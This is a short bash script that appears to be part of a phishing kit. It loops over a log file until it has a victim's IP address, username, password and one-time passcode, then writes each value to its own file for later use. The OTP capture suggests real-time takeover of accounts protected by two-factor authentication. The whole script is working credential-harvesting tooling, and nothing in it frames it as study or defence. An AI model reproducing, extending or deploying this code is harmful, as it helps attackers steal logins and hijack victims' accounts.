#!/bin/bash
printf "" > assets/log.txt
printf ""> process/username.txt
printf ""> process/password.txt
printf ""> process/otp.txt
while true; do
ip=$(cat assets/log.txt | grep 'IP:' | awk '{print $2}')
username=$(cat assets/log.txt | grep 'Username:' | awk '{print $2}')
password=$(cat assets/log.txt | grep 'Password:' | awk '{print $2}')
otp=$(cat assets/log.txt | grep 'OTP:' | awk '{print $2}')
if [[ ! -z "$ip" && ! -z "$username" && ! -z "$password" && ! -z "$otp" ]]; then
printf "$ip"> process/ip.txt
printf "$username"> process/username.txt
printf "$password"> process/password.txt
printf "$otp"> process/otp.txt
break
fi
done
